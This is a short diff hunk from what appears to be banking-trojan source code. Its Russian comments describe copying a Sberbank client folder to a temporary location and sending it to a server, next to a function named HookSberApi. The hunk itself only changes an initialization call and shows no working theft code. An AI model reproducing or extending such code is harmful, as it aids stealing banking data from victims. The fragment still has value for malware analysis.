@@ -348,7 +348,7 @@ static bool HookSberApi()
 //непосредственное копирование папки сбера, сначала копирует во временную папку, а потом отсылает на сервер с временной папки
 static DWORD WINAPI CopyFolderThread( LPVOID lpData )
 {
-	BOT::Initialize();
+	BOT::Initialize(ProcessUnknown);
 	// При отправке данных сбера включаем режим Банк
     SetBankingMode();
 
